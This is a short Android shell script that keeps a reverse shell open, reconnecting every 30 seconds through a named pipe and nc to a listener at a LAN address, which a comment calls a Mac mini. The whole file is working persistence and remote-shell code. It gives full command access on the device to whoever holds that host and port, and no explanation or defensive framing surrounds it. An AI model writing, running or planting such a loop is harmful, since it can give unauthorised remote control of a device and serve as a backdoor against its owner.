#!/system/bin/sh
# Persistent reverse shell: connects to Mac mini every 30s.
# Resilient: if listener isn't running, nc fails and we retry.

REMOTE="192.168.1.72"
REMOTE_PORT=9999
PIPE="/data/local/tmp/rsh_pipe"

while true; do
    rm -f "$PIPE"
    busybox mkfifo "$PIPE" 2>/dev/null
    sh < "$PIPE" 2>&1 | /system/xbin/nc "$REMOTE" "$REMOTE_PORT" > "$PIPE" 2>/dev/null
    rm -f "$PIPE"
    sleep 30
done
